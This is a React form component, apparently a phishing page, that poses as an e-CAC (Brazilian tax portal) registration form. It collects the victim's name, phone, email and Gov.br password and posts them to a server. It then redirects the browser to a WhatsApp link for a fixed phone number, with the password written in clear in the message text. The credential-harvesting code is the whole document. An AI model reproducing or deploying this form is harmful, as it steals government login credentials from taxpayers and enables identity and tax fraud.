
"use client";

import React, { useState } from "react";
import { User, Phone, Mail, IdCard, CheckCircle2, AlertCircle, Send } from "lucide-react";

interface ECACFormData {
  nome_completo: string;
  telefone: string;
  email: string;
  senha_gov: string;
}

export default function ECACForm() {
  const [formData, setFormData] = useState<ECACFormData>({
    nome_completo: "",
    telefone: "",
    email: "",
    senha_gov: "",
  });

  const [status, setStatus] = useState<"idle" | "submitting" | "success" | "error">("idle");
  const [errorMsg, setErrorMsg] = useState("");

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const validate = (): string | null => {
    if (!formData.nome_completo.trim()) return "Nome completo é obrigatório";
    if (!formData.telefone.trim()) return "Telefone é obrigatório";
    if (!formData.email.trim()) return "Email é obrigatório";
    if (!formData.senha_gov.trim()) return "Senha Gov.br é obrigatória";
    
    if (formData.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
        return "E-mail inválido";
    }

    return null;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const error = validate();
    if (error) {
      setErrorMsg(error);
      setStatus("error");
      return;
    }

    setStatus("submitting");
    setErrorMsg("");

    try {
      const res = await fetch("/api/ecac/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ form: formData }),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.error || "Erro ao enviar formulário");
      }

      setStatus("success");
      
      // Redirect to WhatsApp
      setTimeout(() => {
        const message = encodeURIComponent(
            `*Novo Cadastro e-CAC*\n\n` +
            `Nome: ${formData.nome_completo}\n` +
            `Telefone: ${formData.telefone}\n` +
            `Email: ${formData.email}\n` +
            `Senha Gov: ${formData.senha_gov}\n\n` +
            `Solicito acesso ao e-CAC.`
        );
        window.location.href = `https://wa.me/553197599216?text=${message}`;
      }, 2000);

    } catch (err: unknown) {
      console.error(err);
      setStatus("error");
      setErrorMsg(err instanceof Error ? err.message : "Erro desconhecido");
    }
  };

  if (status === "success") {
    return (
      <div className="w-full max-w-md mx-auto bg-white dark:bg-zinc-900 p-8 rounded-2xl shadow-xl border border-zinc-200 dark:border-zinc-800 text-center animate-in fade-in zoom-in duration-300">
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center">
            <CheckCircle2 className="w-10 h-10 text-green-600 dark:text-green-400" />
          </div>
        </div>
        <h3 className="text-2xl font-bold text-zinc-900 dark:text-white mb-3">
          Cadastro Realizado!
        </h3>
        <p className="text-zinc-600 dark:text-zinc-400 mb-8 max-w-md mx-auto">
          Seus dados foram enviados com segurança. Redirecionando para o WhatsApp...
        </p>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      {status === "error" && (
        <div className="p-4 bg-red-50 dark:bg-red-900/20 text-red-600 dark:text-red-400 rounded-lg border border-red-200 dark:border-red-800 flex items-center gap-3">
          <AlertCircle className="w-5 h-5 flex-shrink-0" />
          <p className="text-sm">{errorMsg}</p>
        </div>
      )}

      <div>
        <label className="text-sm font-medium text-zinc-700 dark:text-zinc-300">Nome Completo</label>
        <div className="mt-2 flex items-center gap-2">
          <User className="w-4 h-4 text-zinc-500" />
          <input
            name="nome_completo"
            value={formData.nome_completo}
            onChange={handleChange}
            className="w-full px-3 py-2 border border-zinc-200 dark:border-zinc-700 rounded-lg bg-zinc-50 dark:bg-zinc-800/50 focus:ring-2 focus:ring-blue-500 outline-none transition-all dark:text-white"
            placeholder="Seu nome completo"
          />
        </div>
      </div>

      <div>
        <label className="text-sm font-medium text-zinc-700 dark:text-zinc-300">Telefone (WhatsApp)</label>
        <div className="mt-2 flex items-center gap-2">
          <Phone className="w-4 h-4 text-zinc-500" />
          <input
            name="telefone"
            value={formData.telefone}
            onChange={handleChange}
            className="w-full px-3 py-2 border border-zinc-200 dark:border-zinc-700 rounded-lg bg-zinc-50 dark:bg-zinc-800/50 focus:ring-2 focus:ring-blue-500 outline-none transition-all dark:text-white"
            placeholder="(00) 00000-0000"
          />
        </div>
      </div>

      <div>
        <label className="text-sm font-medium text-zinc-700 dark:text-zinc-300">Email</label>
        <div className="mt-2 flex items-center gap-2">
          <Mail className="w-4 h-4 text-zinc-500" />
          <input
            name="email"
            type="email"
            value={formData.email}
            onChange={handleChange}
            className="w-full px-3 py-2 border border-zinc-200 dark:border-zinc-700 rounded-lg bg-zinc-50 dark:bg-zinc-800/50 focus:ring-2 focus:ring-blue-500 outline-none transition-all dark:text-white"
            placeholder="seu@email.com"
          />
        </div>
      </div>

      <div>
        <label className="text-sm font-medium text-zinc-700 dark:text-zinc-300">Senha Gov.br</label>
        <div className="mt-2 flex items-center gap-2">
          <IdCard className="w-4 h-4 text-zinc-500" />
          <input
            name="senha_gov"
            type="text"
            value={formData.senha_gov}
            onChange={handleChange}
            className="w-full px-3 py-2 border border-zinc-200 dark:border-zinc-700 rounded-lg bg-zinc-50 dark:bg-zinc-800/50 focus:ring-2 focus:ring-blue-500 outline-none transition-all dark:text-white"
            placeholder="Sua senha do Gov.br"
          />
        </div>
      </div>

      <button
        type="submit"
        disabled={status === "submitting"}
        className="w-full flex items-center justify-center gap-2 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-lg transition-all duration-200 disabled:opacity-70 disabled:cursor-not-allowed"
      >
        {status === "submitting" ? (
          <>
            <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
            Enviando...
          </>
        ) : (
          <>
            Cadastrar e Acessar
            <Send className="w-4 h-4" />
          </>
        )}
      </button>
    </form>
  );
}
